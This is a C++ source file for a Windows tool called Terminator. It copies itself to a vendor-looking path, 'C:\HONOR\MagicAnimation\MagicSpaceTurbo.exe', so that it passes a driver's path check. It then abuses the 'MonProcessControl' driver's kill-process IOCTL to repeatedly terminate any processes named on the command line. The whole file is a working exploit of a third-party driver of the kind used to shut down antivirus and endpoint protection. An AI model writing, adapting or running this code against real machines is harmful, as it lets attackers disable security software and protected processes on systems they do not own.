#include <Windows.h>
#include <TlHelp32.h>
#include "terminator.hpp"
#include <vector>
#include <string>
#include <algorithm>
#include <unordered_set>
#include <cctype>
#include <cstdio>

namespace {
    constexpr DWORD IOCTL_KILL_PROCESS = 0x0022400C;
    constexpr const wchar_t* DRIVER_PATH = L"\\\\.\\MonProcessControl";

    std::string ToLower(std::string s) {
        std::transform(s.begin(), s.end(), s.begin(),
            [](unsigned char c) { return std::tolower(c); });
        return s;
    }

    BOOL IsAlreadyRelocated(void) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return strstr(path, "MagicSpaceTurbo.exe") != NULL;
    }

    int Relocate(int argc, char** argv) {
        char src[MAX_PATH], dst[MAX_PATH], cmd[1024];
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };

        GetModuleFileNameA(NULL, src, MAX_PATH);

        CreateDirectoryA("C:\\HONOR", NULL);
        CreateDirectoryA("C:\\HONOR\\MagicAnimation", NULL);
        snprintf(dst, sizeof(dst), "C:\\HONOR\\MagicAnimation\\MagicSpaceTurbo.exe");

        if (!CopyFileA(src, dst, FALSE)) {
            printf("[-] Copy failed: %lu\n", GetLastError());
            return 1;
        }

        printf("[+] Copied to %s\n", dst);

        snprintf(cmd, sizeof(cmd), "\"%s\"", dst);
        for (int i = 1; i < argc; i++) {
            char tmp[64];
            snprintf(tmp, sizeof(tmp), " %s", argv[i]);
            strcat(cmd, tmp);
        }

        si.cb = sizeof(si);
        if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("[-] Relaunch failed: %lu\n", GetLastError());
            return 1;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        DeleteFileA(dst);
        return (int)exitCode;
    }
}

std::vector<DWORD> Terminator::GetProcessPids(const std::vector<std::string>& names) {
    std::vector<DWORD> result;
    if (names.empty()) return result;

    std::unordered_set<std::string> nameSet;
    for (const auto& n : names) {
        nameSet.insert(ToLower(n));
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return result;
    }

    PROCESSENTRY32 pe32{};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::string exeName;
#ifdef UNICODE
            int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, nullptr, 0, nullptr, nullptr);
            if (sizeNeeded > 0) {
                exeName.resize(sizeNeeded - 1);
                WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, &exeName[0], sizeNeeded, nullptr, nullptr);
            }
#else
            exeName = pe32.szExeFile;
#endif
            if (nameSet.find(ToLower(exeName)) != nameSet.end()) {
                result.push_back(pe32.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return result;
}

void Terminator::ProcessKill(const std::vector<std::string>& processNames) {
    if (processNames.empty()) return;

    HANDLE hDevice = CreateFileW(DRIVER_PATH, GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open driver handle. Error: %lu\n", GetLastError());
        return;
    }
    printf("[+] Connected to driver. Monitoring for processes...\n");

    DWORD bytesReturned;
    while (true) {
        bytesReturned = 0;
        const std::vector<DWORD> pids = GetProcessPids(processNames);
        for (DWORD pid : pids) {
            printf("[*] Sending IOCTL 0x%lX to terminate PID %lu...\n", IOCTL_KILL_PROCESS, pid);

            DWORD pid32 = pid;
            BOOL success = DeviceIoControl(hDevice, IOCTL_KILL_PROCESS,
                                           &pid32, sizeof(pid32),
                                           nullptr, 0,
                                           &bytesReturned, nullptr);

            if (!success) {
                printf("[-] DeviceIoControl failed for PID %lu. Error: %lu\n", pid, GetLastError());
            } else {
                printf("[+] Success! IOCTL sent for PID %lu.\n", pid);
            }
        }
        Sleep(300);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s -proc <process_name1> [process_name2] ...\n", argv[0]);
        return 1;
    }

    if (std::string(argv[1]) != "-proc") {
        printf("Unknown command: %s\n", argv[1]);
        return 1;
    }

    if (!IsAlreadyRelocated()) {
        printf("[*] Relocating to bypass path check...\n");
        return Relocate(argc, argv);
    }

    std::vector<std::string> processNames;
    for (int i = 2; i < argc; ++i) {
        processNames.emplace_back(argv[i]);
    }

    Terminator terminator;
    terminator.ProcessKill(processNames);
    return 0;
}
